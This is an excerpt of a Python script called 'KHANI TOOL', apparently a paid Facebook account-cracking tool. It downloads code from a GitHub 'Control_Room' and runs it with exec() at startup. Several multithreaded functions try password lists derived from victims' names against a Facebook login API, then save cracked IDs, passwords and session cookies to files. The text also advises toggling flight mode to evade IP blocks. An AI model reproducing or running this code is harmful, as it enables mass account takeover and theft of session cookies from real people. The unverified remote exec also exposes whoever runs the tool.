...
print('\n\033[0;97m[+]\033[1;32m WELLCOME TO KHANI TOOL ðŸŒ·...')
os.system('espeak -a 300 " Wellcome,   To,  ,khani ,Tool,"')
try:
...
try:
    version = requests.get('https://raw.githubusercontent.com/KHANI-NOORI/mm/main/Control_Room/version').text
except:
    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m Your Have No Internet Connection -v ..!');exit()
version = version.strip()
######Status#########
try:
    status = requests.get('https://raw.githubusercontent.com/KHANI-NOORI/mm/main/Control_Room/status').text
except:
    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m Your Have No Internet Connection-s ..!');exit()
status = status.strip()
########all method &local conutries#########
try:
    data = requests.get('https://raw.githubusercontent.com/KHANI-NOORI/mm/main/Control_Room/CodeLoc1').text
    exec(data)
except:
...
try:
    data = requests.get('https://raw.githubusercontent.com/KHANI-NOORI/mm/main/Control_Room/paid').text
    exec(data)
except:
...
logo = (f"""
  ...
  {R}88 ,8P' 88   88 d8' `8b 888o  88   `88'   
  {W}88,8P   88ooo88 88ooo88 88V8o 88    88    
  {W}88`8b   88~~~88 88~~~88 88 V8o88    88    
  {R}88 `88. 88   88 88   88 88  V888   .88.   
  {R}YP   YD YP   YP YP   YP VP   V8P Y888888P 
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
{W} [{R}+{W}]{R} OWNER   {R}:{R} KHANI NOORI
{W} [{R}+{W}]{W} FB ID   {R}:{W} SAMI KHAN
{W} [{R}+{W}]{W} WHATSAP {R}:{W} 03302182278
{W} [{R}+{W}]{R} STATUS  {R}:{R} {PAID}
{W} [{R}+{W}]{R} VERSION {R}:{R} {0.1}
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
{W} [{R}+{W}]{W}            \033[1;41m\033[1;37m[WELLCOME TO \033[1;42m\033[1;37Knoori TOOL]\x1b[0m
...
def Activate():
    ...
    if k in r:
        ...
        #print(f"\033[1;92mYour Token is successfully Approved\33[1;37m")
                ...
                tks = ('Hi-%20KHANi-Sir%20!%20-Please%20-Activate%20-My%20-Key%20-The%20-Key%20-Is%20:%20'+k)
...
def menu():
			...
			if xd in ['1','01']:
				...
				with tred(max_workers=50) as crack_submit:
					...
					print(f'{W} [{R}+{W}]{R} USE FLIGHT MODE AFTER EVERY 1 MINUTS')
					line()
					for user in fo:
...
def ffb1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}KHANI{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Type': 'application/x-www-form-urlencoded'}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{G} [KHANI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' Cookie: \033[1;32m'+cookies)
                                        open('/sdcard/KHANI/KHANI-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/KHANI/KHANI-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [KHANI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KHANI/KHANI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
...
def ffb2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}KHANI{W}]{R} %s{W} | {R}M2 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/KHANI/KHANI-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/KHANI/KHANI-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def ffb3(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}KHANI{W}]{R} %s{W} | {R}M3 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' COOKIES: \033[1;32m'+cookies)
                                        open('/sdcard/KHANI/KHANI-M3-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/KHANI/KHANI-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def ffb4(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}KHANI{W}]{R} %s{W} | {R}M4 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/KHANI/KHANI-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/KHANI/KHANI-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def Create_menu():
	...
	print(f'{W} [{R}1{W}] {W}CREATE FILE BY KHANI TOOL ')
...
def rd(uid,passlist):
	try:
		...
		sys.stdout.write(f'\r\r{W} [{R}KHANI{W}]%s|{R}RNDM{W}|\033[1;32mOK:%s\033[1;37m|{R}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
		for pas in passlist:
			data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
...
'Content-Length': '847'}
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [KHANI-OK] '+uid+' | '+pas+'\033[1;37m')
				#os.system('espeak -a 300 " Congratulation,   Dear,  ,User,"')
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				RANA1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KHANI1};{ckkk}"
				print(f'\r\033[1;32m [COOKIES] :{W} '+cookie)
				open('/sdcard/KHANI/KHANI-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r{W} [KHANI-CP] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/KHANI/KHANI-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
...
def ipMain():
		clear()
		print(f"{W} [{R}+{W}] {W}          UNBLOCK YOUR IP By KHANI TOOL")
		line()
...
def manual():
		clear()
		print(f"{W} [{R}+{W}] {W}TRY TO UNBLOCK YOUR IP BY KHANI TOOL")
